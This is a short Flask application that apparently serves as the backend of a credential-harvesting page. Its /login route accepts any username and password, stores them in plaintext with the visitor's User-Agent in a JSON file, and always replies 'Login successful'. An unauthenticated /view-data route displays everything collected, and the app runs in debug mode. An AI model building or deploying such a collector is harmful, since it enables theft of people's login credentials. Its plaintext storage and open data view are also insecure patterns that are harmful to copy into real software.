from flask import Flask, request, render_template
import requests
from urllib.parse import quote as url_quote
import json
import os

app = Flask(__name__)

data_file = 'collected_data.json'

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.json.get('username')
    password = request.json.get('password')
    device_info = request.headers.get('User-Agent')

    data = {
        'username': username,
        'password': password,
        'device_info': device_info
    }

    # Store data in a JSON file
    if os.path.exists(data_file):
        with open(data_file, 'r+') as file:
            existing_data = json.load(file)
            existing_data.append(data)
            file.seek(0)
            json.dump(existing_data, file, indent=4)
    else:
        with open(data_file, 'w') as file:
            json.dump([data], file, indent=4)

    return {"status": "Login successful"}, 200

@app.route('/view-data', methods=['GET'])
def view_data():
    if os.path.exists(data_file):
        with open(data_file, 'r') as file:
            data = json.load(file)
        return render_template('view_data.html', data=data)
    return "No data available", 404

if __name__ == '__main__':
    app.run(debug=True)
